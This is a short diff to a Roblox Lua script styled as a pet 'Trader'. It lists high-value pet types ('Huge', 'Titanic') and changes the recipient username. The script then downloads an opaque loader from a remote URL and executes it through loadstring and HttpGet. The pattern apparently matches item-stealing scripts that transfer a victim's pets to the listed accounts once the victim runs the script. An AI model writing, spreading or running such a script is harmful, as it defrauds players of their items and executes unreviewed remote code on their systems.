@@ -19,7 +19,7 @@ getgenv().Trader = {
         
            },
         },
-    ['Usernames'] = {"kingltn2"},
+    ['Usernames'] = {"letunamrb"},
     ['All Pets'] = {"Huge", "Titanic"}, -- Add general pet types or specific names
 }
 loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/b19b14b49f5ce19867b84dbac8171333.lua"))()
